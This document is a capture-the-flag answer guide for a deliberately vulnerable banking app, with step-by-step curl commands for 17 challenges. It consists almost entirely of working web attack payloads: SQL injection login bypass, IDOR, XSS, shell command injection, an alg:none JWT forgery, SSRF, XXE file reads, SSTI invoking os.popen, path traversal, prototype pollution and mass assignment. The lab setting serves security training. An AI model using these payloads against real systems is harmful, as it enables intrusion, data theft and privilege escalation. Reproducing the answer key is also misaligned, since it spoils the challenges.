# Challenge Solving Steps (17 cards)

This guide matches the 17 visible player cards. Each challenge launches its own target container even when two cards share a grouped image. Solve against the instance URL for that card.

```bash
export TARGET=http://vbank-app   # or http://HOST_IP:PORT from the Launch Instance banner
export COOKIES=/tmp/ctf_customer.txt
export STAFF_COOKIES=/tmp/ctf_staff.txt
```

Customer login (reuse for customer-side challenges):

```bash
curl -s -c "$COOKIES" -b "$COOKIES" \
  -X POST "$TARGET/customer/login" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=x" \
  -L >/dev/null
```

Staff login (reuse for staff-side challenges):

```bash
curl -s -c "$STAFF_COOKIES" -b "$STAFF_COOKIES" \
  -X POST "$TARGET/maintenance-portal" \
  --data-urlencode "emp_id=anything" \
  --data-urlencode "password=' OR '1'='1" \
  -L >/dev/null
```

## 1. Trust, Not Verified (`sqli_login`, 150)

Bypass `/customer/login` with SQL injection in the username field. The dashboard contains the flag.

```bash
curl -s -c "$COOKIES" -b "$COOKIES" \
  -X POST "$TARGET/customer/login" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=x" \
  -L | grep -o 'LYD{[^}]*}'
```

## 2. Someone Else's Numbers (`idor_statements`, 200)

After customer login, fetch another account's statements. Account `1337` has the flag in a memo.

```bash
curl -s -b "$COOKIES" "$TARGET/api/v1/accounts/1337/transactions" | grep -o 'LYD{[^}]*}'
```

## 3. The Account No One Touches (`idor_transfer`, 225)

The CEO statement mentions a double-base64 account. Confirm a transfer to it, or POST `compliance_status=approved` for KADABOOM.

```bash
curl -s -b "$COOKIES" \
  "$TARGET/account/transfer/confirm?acct=TVRneU5EVXpOamN4TUE9PQ==" | grep -o 'LYD{[^}]*}'

curl -s -b "$COOKIES" -X POST "$TARGET/account/transfer/confirm" \
  --data-urlencode "recipient=KADABOOM" \
  --data-urlencode "compliance_status=approved" | grep -o 'LYD{[^}]*}'
```

## 4. Faster Than Careful (`race_condition`, 300)

Reset the express-transfer balance, then fire many parallel transfers of £1000. Check status when the balance goes negative.

```bash
curl -s -b "$COOKIES" -X POST "$TARGET/api/v1/account/reset"
for i in $(seq 1 25); do
  curl -s -b "$COOKIES" -X POST "$TARGET/api/v1/transfer/express" -d amount=1000 &
done
wait
curl -s -b "$COOKIES" "$TARGET/api/v1/account/status"
```

## 5. Word For Word (`reflected_xss`, 75)

Search reflects `q` without encoding. The flag is in the `X-Internal-Note` header.

```bash
curl -i -s -b "$COOKIES" --get "$TARGET/search" \
  --data-urlencode 'q=<script>alert(1)</script>' | grep -i 'X-Internal-Note\|LYD{'
```

## 6. No Handle on Your Side (`staff_sqli`, 175)

Inject the password field on `/maintenance-portal`. The staff dashboard shows the flag.

```bash
curl -s -c "$STAFF_COOKIES" -b "$STAFF_COOKIES" \
  -X POST "$TARGET/maintenance-portal" \
  --data-urlencode "emp_id=anything" \
  --data-urlencode "password=' OR '1'='1" \
  -L | grep -o 'LYD{[^}]*}'
```

## 7. Who's Really Typing (`rce`, 425)

Staff maintenance runs `cmd` with `shell=True`. Read `/root/flag.txt`.

```bash
curl -s -b "$STAFF_COOKIES" -X POST "$TARGET/staff/maintenance" \
  --data-urlencode 'cmd=cat /root/flag.txt'
```

## 8. Redirected Trust (`open_redirect`, 125)

Login with an external `next=` URL. Do not follow the 302 — the flag is in the response body.

```bash
curl -si -c "$COOKIES" \
  -X POST "$TARGET/customer/login?next=http://evil.example" \
  --data-urlencode "username=' OR '1'='1" \
  --data-urlencode "password=x" | grep -o 'LYD{[^}]*}'
```

## 9. Feedback Loop (`xss`, 275)

Store a script in a support ticket, then view `/staff/tickets` as staff.

```bash
curl -s -b "$COOKIES" -X POST "$TARGET/account/support" \
  --data-urlencode 'message=<script>alert(1)</script>'
curl -s -b "$STAFF_COOKIES" "$TARGET/staff/tickets" | grep -o 'LYD{[^}]*}'
```

## 10. Unsigned Agreement (`jwt`, 250)

Forge a JWT with `alg: none` and `role: admin`, then call the corporate vault.

```bash
H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=\n')
P=$(echo -n '{"role":"admin","sub":"attacker"}' | base64 | tr '+/' '-_' | tr -d '=\n')
curl -s "$TARGET/api/v2/corporate/vault" -H "Authorization: Bearer ${H}.${P}."
```

## 11. The Repeating Pattern (`crypto_ecb`, 325)

Fetch `TXN-SYSTEM`, decrypt AES-ECB with `vbank_security!!`.

```bash
python - <<'PY'
import base64, json, os, urllib.request
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
# Use the ciphertext from GET /api/v1/receipts/TXN-SYSTEM
# key = b'vbank_security!!'
PY
```

```bash
curl -s -b "$COOKIES" "$TARGET/api/v1/receipts/TXN-SYSTEM"
# decrypt encrypted_receipt with AES-128-ECB key vbank_security!!
```

## 12. Internal Affairs (`ssrf`, 350)

Document fetch blocks some loopback strings. `http://127.1/api/internal/debug` works.

```bash
curl -s -b "$STAFF_COOKIES" -X POST "$TARGET/support/document-fetch" \
  -d 'url=http://127.1/api/internal/debug'
```

## 13. Document Confession (`xxe`, 375)

Payroll XML import resolves external entities. Read `/etc/vbank_internal.txt`.

```bash
curl -s -b "$STAFF_COOKIES" -X POST "$TARGET/staff/payroll" \
  --data-urlencode 'xml_data=<?xml version="1.0"?><!DOCTYPE p [<!ENTITY x SYSTEM "file:///etc/vbank_internal.txt">]><payroll><employee><id>1</id><name>&x;</name><department>IT</department><salary>1</salary><note>x</note></employee></payroll>'
```

## 14. Shared State (`proto_pollution`, 400)

This target starts the analytics sidecar. Pollute `__proto__` then open the admin panel.

```bash
curl -s -b "$STAFF_COOKIES" -H 'Content-Type: application/json' \
  -X POST "$TARGET/api/settings/merge" \
  -d '{"__proto__":{"isAdmin":true}}'
curl -s -b "$STAFF_COOKIES" "$TARGET/api/settings/admin-panel"
```

## 15. Template Escape (`ssti`, 300)

Display-name preview is concatenated into `render_template_string`. Read `/opt/vbank/ssti_flag.txt`.

```bash
curl -s -b "$COOKIES" -X POST "$TARGET/account/profile" \
  --data-urlencode 'display_name={{ cycler.__init__.__globals__.os.popen("cat /opt/vbank/ssti_flag.txt").read() }}'
```

## 16. The Archivist (`path_traversal`, 275)

The file browser strips `../` once. `....//` reconstitutes traversal.

```bash
curl -s -b "$STAFF_COOKIES" "$TARGET/staff/files?name=....//logs/path_flag.txt"
```

## 17. Privilege by Payload (`mass_assignment`, 250)

HR onboarding accepts a client-supplied `role`.

```bash
curl -s -b "$STAFF_COOKIES" -H 'Content-Type: application/json' \
  -X POST "$TARGET/api/v1/staff/onboard" \
  -d '{"emp_id":"xadmin","password":"xadmin","role":"admin"}'
```
